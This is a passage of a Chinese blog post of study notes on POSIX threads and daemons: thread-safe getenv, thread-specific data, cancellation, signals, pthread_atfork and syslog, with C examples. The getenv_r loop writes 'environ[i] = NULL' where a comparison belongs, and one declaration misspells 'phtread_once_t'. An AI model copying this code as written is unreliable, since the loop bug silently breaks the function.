class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pthread_mutexattr_t</span> attr;<br>    pthread_mutexattr_init(&amp;attr);<br>    pthread_mutexattr_settype(&amp;attr, PTHREAD_MUTEX_RECURSIVE); <span class="hljs-comment">//可以反复加锁</span><br>    pthread_mutex_init(&amp;env_mutex, &amp;attr);<br>    pthread_mutexattr_destroy(&amp;attr);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">getenv_r</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> buflen)</span><br>&#123;<br>    <span class="hljs-type">int</span> i, len, olen;<br>    pthread_once(&amp;init_done, thread_init); <span class="hljs-comment">//只执行一次</span><br>    len = <span class="hljs-built_in">strlen</span>(name);<br>    pthread_mutex_lock(&amp;env_mutex);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i] = <span class="hljs-literal">NULL</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">strncmp</span>(name, environ[i], len) == <span class="hljs-number">0</span>) &amp;&amp;<br>        (environ[i][len] == <span class="hljs-string">&#x27;=&#x27;</span>))&#123;<br>            olen = <span class="hljs-built_in">strlen</span>(&amp;environ[i][len+<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">if</span> (olen &gt;= buflen)&#123;<br>                pthread_mutex_unlock(&amp;env_mutex);<br>                <span class="hljs-keyword">return</span>(ENOSPC);<br>            &#125;<br>            <span class="hljs-built_in">strcpy</span>(buf, &amp;environ[i][len+<span class="hljs-number">1</span>]);<br>            pthread_mutex_unlock(&amp;env_mutex);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    pthread_mutex_unlock(&amp;env_mutex);<br>    <span class="hljs-keyword">return</span>(ENOENT);<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="线程特定数据"><a href="#线程特定数据" class="headerlink" title="线程特定数据"></a>线程特定数据</h2><p><strong>创建数据关联的键</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_key_create</span><span class="hljs-params">(<span class="hljs-type">pthread_key_t</span> *keyp, <span class="hljs-type">void</span> (*destructor)(<span class="hljs-type">void</span> *))</span>;<br><span class="hljs-comment">//Returns:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>删除键的关联</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_key_delete</span><span class="hljs-params">(<span class="hljs-type">pthread_key_t</span> key)</span>;<br><span class="hljs-comment">//Returns:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>一次初始化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">pthread_once_t</span> initflag = PTHREAD_ONCE_INIT;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_once</span><span class="hljs-params">(<span class="hljs-type">phtread_once_t</span> *initflag, <span class="hljs-type">void</span> (*initfn)(<span class="hljs-type">void</span>))</span>;<br></code></pre></td></tr></table></figure><p><strong>特定数据与键关联</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">pthread_getspecific</span><span class="hljs-params">(<span class="hljs-type">pthread_key_t</span> key)</span>;<br>Returns:thread-specific data value or <span class="hljs-literal">NULL</span> <span class="hljs-keyword">if</span> no value has benn associated with the key<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_setspecific</span><span class="hljs-params">(<span class="hljs-type">pthread_key_t</span> key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *value)</span>;<br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK,error nnumber on failure<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSTRINGSZ 4096</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_key_t</span> key;<br><span class="hljs-type">static</span> <span class="hljs-type">pthread_once_t</span> init_done = PTHREAD_ONCE_INIT;<br><span class="hljs-type">pthread_mutex_t</span> env_mutex = PTHREAD_MUTEX_INITIALIZER;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **environ;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">thread_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    pthread_key_create(&amp;key, <span class="hljs-built_in">free</span>);<br>&#125;<br><br><span class="hljs-type">char</span> *<br><span class="hljs-title function_">getenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">int</span> i, len;<br>    <span class="hljs-type">char</span> *envbuf;<br><br>    pthread_once(&amp;init_done, thread_init);<br>    pthread_mutex_lock(&amp;env_mutex);<br>    envbuf = (<span class="hljs-type">char</span> *)pthread_getspecific(key);<br>    <span class="hljs-keyword">if</span> (envbuf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        envbuf = <span class="hljs-built_in">malloc</span>(MAXSTRINGSZ);<br>        <span class="hljs-keyword">if</span> (envbuf == <span class="hljs-literal">NULL</span>)&#123;<br>            pthread_mutex_unlock(&amp;env_mutex);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        pthread_setspecific(key, envbuf);<br>    &#125;<br>    len = <span class="hljs-built_in">strlen</span>(name);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i] != <span class="hljs-literal">NULL</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">strncmp</span>(name, environ[i], len) == <span class="hljs-number">0</span>) &amp;&amp;<br>        (environ[i][len] == <span class="hljs-string">&#x27;=&#x27;</span>))&#123;<br>            <span class="hljs-built_in">strncpy</span>(envbuf, &amp;environ[i][len+<span class="hljs-number">1</span>], MAXSTRINGSZ<span class="hljs-number">-1</span>);<br>            pthread_mutex_unlock(&amp;env_mutex);<br>            <span class="hljs-keyword">return</span>(envbuf);<br>        &#125;<br>    &#125;<br>    pthread_mutex_unlock(&amp;env_mutex);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="取消选项"><a href="#取消选项" class="headerlink" title="取消选项"></a>取消选项</h2><p><code>pthread_attr_t</code>结构中不包含两个线程属性，需要通过<code>pthread_cancel</code>函数进行设置</p><ul><li>可取消状态<ul><li><code>PTHREAD_CANCEL_ENABLE</code></li><li><code>PTHREAD_CANCEL_DISABLE</code></li></ul></li><li>可取消类型</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_setcancelstate</span><span class="hljs-params">(<span class="hljs-type">int</span> state, <span class="hljs-type">int</span> *oldstate)</span>;<br><span class="hljs-comment">//Returns:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230116002822460.png" alt="image-20230116002822460"></p><h3 id="设置取消点"><a href="#设置取消点" class="headerlink" title="设置取消点"></a>设置取消点</h3><p>自定义取消点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pthread_testcancel</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h3 id="设置取消类型"><a href="#设置取消类型" class="headerlink" title="设置取消类型"></a>设置取消类型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_setcanceltype</span><span class="hljs-params">(<span class="hljs-type">int</span> type, <span class="hljs-type">int</span> *oldtype)</span>;<br><span class="hljs-comment">//Returns:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="线程与信号"><a href="#线程与信号" class="headerlink" title="线程与信号"></a>线程与信号</h2><p><strong>修改进程的信号阻塞行为</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_sigmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-keyword">restrict</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *<span class="hljs-keyword">restrict</span> oset)</span>;<br><span class="hljs-comment">//Returns:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>等待信号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigwait</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-keyword">restrict</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> signop)</span>;<br><span class="hljs-comment">//Returns:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><p><strong>发送信号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_kill</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> thread, <span class="hljs-type">int</span> signo)</span>;<br><span class="hljs-comment">//Returns:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="线程与fork"><a href="#线程与fork" class="headerlink" title="线程与fork"></a>线程与fork</h2><p>线程的<code>fork</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_atfork</span><span class="hljs-params">(<span class="hljs-type">void</span> (*prepare)(<span class="hljs-type">void</span>), <span class="hljs-type">void</span> (*parent)(<span class="hljs-type">void</span>), <span class="hljs-type">void</span>(*child)(<span class="hljs-type">void</span>))</span>;<br><span class="hljs-comment">//Returns:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><ul><li><code>prepare</code>：获取父级定义的所有锁</li><li><code>parent</code>：在父进程中，解锁<code>preparefork</code>获取的锁</li><li><code>child</code>：在子进程中，解锁<code>prepparefork</code>获取的锁</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">pthread_mutex_t</span> lock1 = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-type">pthread_mutex_t</span> lock2 = PTHREAD_MUTEX_INITIALIZER;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">prepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;preparing locks...\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_lock(&amp;lock1)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t lock lock1 in prepare handler&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_lock(&amp;lock2)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t lock lock2 in prepare handler&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">parent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent unlocking locks...\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_unlock(&amp;lock1)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t unlock lock1 in parent handler&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_unlock(&amp;lock2)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t unlock lock2 in parent handler&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">child</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child unlocking locks...\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_unlock(&amp;lock1)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t unlock lock1 in child handler&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((err = pthread_mutex_unlock(&amp;lock2)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t unlock lock2 in child handler&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">thr_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread started...\n&quot;</span>);<br>    pause();<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">pthread_t</span> tid;<br><br>    <span class="hljs-keyword">if</span> ((err = pthread_atfork(prepare, parent, child)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t install fork handlers&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((err = pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thr_fn, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t create thread&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent about to fork...\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child returned from fork\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent returned from fork\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230117001028533.png" alt="image-20230117001028533"></p><h2 id="线程与I-x2F-O"><a href="#线程与I-x2F-O" class="headerlink" title="线程与I&#x2F;O"></a>线程与I&#x2F;O</h2><p><strong>pread与pwrite</strong>用于处理线程间读写</p><h1 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h1><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230118235450382.png" alt="image-20230118235450382"></p><p><strong>读取日志信息的函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">openlog</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *ident, <span class="hljs-type">int</span> option, <span class="hljs-type">int</span> facility)</span>; <span class="hljs-comment">//打开日志文件</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ident:通常为添加到日志文件中的程序名</span><br><span class="hljs-comment">option:用于指定各种选项的掩码</span><br><span class="hljs-comment">facility:用途</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">syslog</span><span class="hljs-params">(<span class="hljs-type">int</span> priority, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">priority:优先级</span><br><span class="hljs-comment">format:格式化字符串参数</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">closelog</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//关闭用于与syslogd守护进程通信的描述符</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setlogmask</span><span class="hljs-params">(<span class="hljs-type">int</span> maskpri)</span>; <span class="hljs-comment">//设置进程的日志优先级掩码</span><br><span class="hljs-comment">//Returns:previous log priority mask value</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230129204719364.png" alt="image-20230129204719364"></p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230129205516099.png" alt="image-20230129205516099"></p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230129205535605.png" alt="image-20230129205535605"></p><p><strong>自定义的日志打印函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vsyslog</span><span class="hljs-params">(<span class="hljs-type">int</span> priority, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, va_list arg)</span>;<br></code></pre></td></tr></table></figure><h2 id="单独实例守护进程"><a href="#单独实例守护进程" class="headerlink" title="单独实例守护进程"></a>单独实例守护进程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOCKFILE <span class="hljs-string">&quot;/var/run/daemon.pid&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOCKMODE (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">lockfile</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">already_running</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>];<br>    fd = open(LOCKFILE, O_RDWR | O_CREAT, LOCKMODE);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)&#123;<br>        syslog(LOG_ERR, <span class="hljs-string">&quot;can&#x27;t open %s: %s&quot;</span>, LOCKFILE, strerror(errno));<br>        <span class="hljs-built_in">exit</span>(<span 